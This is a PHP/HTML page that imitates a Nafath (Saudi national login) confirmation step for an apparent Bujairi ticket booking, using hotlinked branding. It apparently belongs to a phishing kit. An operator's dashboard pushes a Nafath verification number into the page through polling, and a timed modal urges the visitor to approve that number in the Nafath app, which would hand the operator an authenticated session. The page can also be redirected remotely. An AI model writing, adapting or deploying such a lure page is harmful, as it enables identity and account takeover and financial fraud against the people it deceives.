<?php
declare(strict_types=1);
require __DIR__ . '/../dashboard/init.php';
auth_require_customer_login_or_redirect();

$id = (int) ($_GET['id'] ?? 0);
$order = $id > 0 ? order_by_id(bujairi_pdo(), $id) : null;
if (!$order) {
    http_response_code(404);
    echo '<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>نفاذ</title></head><body style="font-family:Tajawal,Arial,sans-serif;text-align:center;padding:2rem;background:#f8fafc;">';
    echo '<p>يجب فتح هذه الصفحة من رابط يتضمن رقم الطلب (مثلاً بعد التوجيه من لوحة التحكم).</p>';
    echo '<p><a href="' . h(url('index.php')) . '">الرئيسية</a></p></body></html>';
    exit;
}

$code = trim((string) ($order['nafath_code'] ?? ''));
$imageUrl = bujairi_nafath_fixed_banner_url();

$pageTitle = 'تأكيد الطلب - نفاذ';
$nafathStateUrl = url('booking/nafath-state.php?id=' . (int) $order['id']);
?><!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo h($pageTitle); ?></title>
    <link rel="icon" href="https://s3.ticketmx.com/bujairi/images/favicon.ico">
    <style>
        :root { --brand: #0a3550; }
        * { box-sizing: border-box; }
        html, body { height: 100%; margin: 0; font-family: Arial, Helvetica, sans-serif; background: #fff; }

        .stage {
            min-height: 100vh;
            display: block;
            padding: 0 16px 88px;
            background: #fff;
        }

        .img-wrap {
            width: 100%;
            max-width: 680px;
            margin: 0 auto;
        }
        .img-wrap img {
            width: 100%;
            height: auto;
            display: block;
            object-fit: contain;
            border: 0;
            box-shadow: none;
            user-select: none;
            -webkit-user-drag: none;
        }
        .timer-bar {
            position: fixed;
            left: 12px;
            right: 12px;
            bottom: 12px;
            background: #fff;
            border: 2px solid #eaeaea;
            border-radius: 14px;
            padding: 10px 16px;
            text-align: center;
            z-index: 5000;
        }
        .timer-title { font-size: 14px; color: #333; margin: 0 0 6px; }
        .timer {
            font-variant-numeric: tabular-nums;
            font-size: 30px;
            font-weight: 800;
            color: var(--brand);
            letter-spacing: 0.5px;
            line-height: 1;
        }
        @media (min-width: 768px) {
            .timer { font-size: 36px; }
        }

        .overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.45);
            align-items: center;
            justify-content: center;
            z-index: 9000;
        }
        .modal {
            background: #fff;
            padding: 24px 20px;
            border-radius: 12px;
            text-align: center;
            max-width: 400px;
            width: 92%;
        }
        .modal h2 {
            margin: 0 0 16px;
            font-size: 16px;
            color: #111;
            line-height: 1.6;
        }

        .nafath-number {
            font-size: 48px;
            font-weight: 900;
            color: var(--brand);
            margin: 20px 0;
            letter-spacing: 3px;
            padding: 20px;
            background: #f0f8ff;
            border-radius: 12px;
            border: 3px solid var(--brand);
            direction: ltr;
        }

        .waiting-msg {
            color: #666;
            font-size: 14px;
            margin: 15px 0;
        }

        .close-btn {
            margin-top: 16px;
            padding: 10px 20px;
            background: #6c757d;
            color: #fff;
            border: 0;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
        }
        .close-btn:hover { background: #5a6268; }

        .top-link {
            display: block;
            text-align: center;
            padding: 12px;
            font-size: 13px;
        }
        .top-link a { color: #0a3550; font-weight: 700; }
    </style>
</head>
<body>

<main class="stage">
    <p class="top-link"><a href="<?php echo h(url('index.php')); ?>">← الرئيسية</a></p>
    <div class="img-wrap" id="nafathBannerWrap">
        <img id="nafathBannerImg" src="<?php echo h($imageUrl); ?>" alt="">
    </div>
</main>

<div class="timer-bar" aria-live="polite">
    <p class="timer-title">الوقت المتبقي</p>
    <div id="timer" class="timer">01:00</div>
</div>

<div class="overlay" id="overlay">
    <div class="modal">
        <h2>الرجاء فتح تطبيق نفاذ وتأكيد الطلب باختيار الرقم أدناه</h2>
        <div id="nafathNumber" class="nafath-number">…</div>
        <p class="waiting-msg" id="nafathWaitMsg">في انتظار الرقم من النظام</p>
        <button type="button" class="close-btn" onclick="closeModal()">إغلاق</button>
    </div>
</div>

<script>
window.__NAFATH_ORDER_ID__ = <?php echo (int) $order['id']; ?>;
window.__NAFATH_INITIAL__ = <?php echo json_encode(
    [
        'orderId' => (int) $order['id'],
        'code' => $code,
        'imageUrl' => $imageUrl,
    ],
    JSON_UNESCAPED_UNICODE
); ?>;
window.__NAFATH_STATE_URL__ = <?php echo json_encode($nafathStateUrl, JSON_UNESCAPED_UNICODE); ?>;

function openModal() {
    var o = document.getElementById('overlay');
    if (o) o.style.display = 'flex';
}
function closeModal() {
    var o = document.getElementById('overlay');
    if (o) o.style.display = 'none';
}

var __nafathLastCode = '';
function applyNafathPayload(data) {
    if (!data) return;
    if (window.__NAFATH_ORDER_ID__) {
        if (data.orderId == null || String(data.orderId) !== String(window.__NAFATH_ORDER_ID__)) {
            return;
        }
    }
    var numEl = document.getElementById('nafathNumber');
    var msg = document.getElementById('nafathWaitMsg');

    if (typeof data.code === 'string' && data.code !== '' && numEl) {
        if (data.code !== __nafathLastCode) {
            __nafathLastCode = data.code;
            numEl.textContent = data.code;
            if (msg) {
                msg.textContent = '';
                msg.style.color = '#28a745';
            }
            openModal();
        }
    }
}

window.bujairiOnNafathDisplayUpdated = function (data) {
    applyNafathPayload(data);
};

window.bujairiShowRedirectLoadingThenGo = function (targetUrl) {
    var loadingScreen = document.createElement('div');
    loadingScreen.style.cssText =
        'position:fixed;inset:0;background:linear-gradient(135deg,#0a3d54 0%,#0d5a78 100%);z-index:99999;' +
        'display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:Tajawal,Cairo,Arial,sans-serif;' +
        'opacity:0;animation:bujNfFadeIn 0.3s ease forwards;';
    loadingScreen.innerHTML =
        '<img src="https://s3.ticketmx.com/bujairi/images/bujairi-ar.svg" alt="" style="width:100px;margin-bottom:40px;opacity:0;filter:brightness(0) invert(1);animation:bujNfFadeInDown 0.5s ease 0.2s forwards">' +
        '<div style="width:80px;height:80px;border:6px solid rgba(255,255,255,0.3);border-top:6px solid #fff;border-radius:50%;margin-bottom:30px;animation:bujNfSpin 1s linear infinite,bujNfFadeIn 0.5s ease 0.3s forwards"></div>' +
        '<div style="font-size:22px;font-weight:700;color:#fff;margin-bottom:12px;opacity:0;animation:bujNfFadeInUp 0.5s ease 0.4s forwards">جاري التحميل...</div>' +
        '<div style="font-size:15px;color:rgba(255,255,255,0.9);opacity:0;animation:bujNfFadeInUp 0.5s ease 0.5s forwards">يرجى الانتظار</div>' +
        '<div style="width:200px;height:4px;background:rgba(255,255,255,0.3);border-radius:10px;margin-top:30px;overflow:hidden;opacity:0;animation:bujNfFadeIn 0.5s ease 0.6s forwards">' +
        '<div style="width:0;height:100%;background:#fff;border-radius:10px;animation:bujNfProgress 3s ease forwards"></div></div>' +
        '<style>' +
        '@keyframes bujNfSpin{to{transform:rotate(360deg)}}' +
        '@keyframes bujNfFadeIn{to{opacity:1}}' +
        '@keyframes bujNfFadeInDown{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}' +
        '@keyframes bujNfFadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}' +
        '@keyframes bujNfProgress{to{width:100%}}' +
        '</style>';
    document.body.appendChild(loadingScreen);
    setTimeout(function () {
        window.location.href = targetUrl;
    }, 3000);
};
</script>
<?php require __DIR__ . '/../dashboard/booking-realtime-script.php'; ?>
<script>
(function () {
    applyNafathPayload(window.__NAFATH_INITIAL__);

    (function startCountdown() {
        var out = document.getElementById('timer');
        if (!out) return;
        var total = 60;
        function fmt(s) {
            var m = Math.floor(s / 60),
                r = s % 60;
            return (m < 10 ? '0' : '') + m + ':' + (r < 10 ? '0' : '') + r;
        }
        out.textContent = fmt(total);
        setInterval(function () {
            total = Math.max(0, total - 1);
            out.textContent = fmt(total);
        }, 1000);
    })();

    setTimeout(function () {
        openModal();
    }, 5000);

    function pollState() {
        var u = window.__NAFATH_STATE_URL__;
        if (!u) return;
        fetch(u, { credentials: 'same-origin' })
            .then(function (r) {
                return r.json();
            })
            .then(function (d) {
                applyNafathPayload(d);
            })
            .catch(function () {});
    }
    setInterval(pollState, 2800);
})();
</script>
</body>
</html>
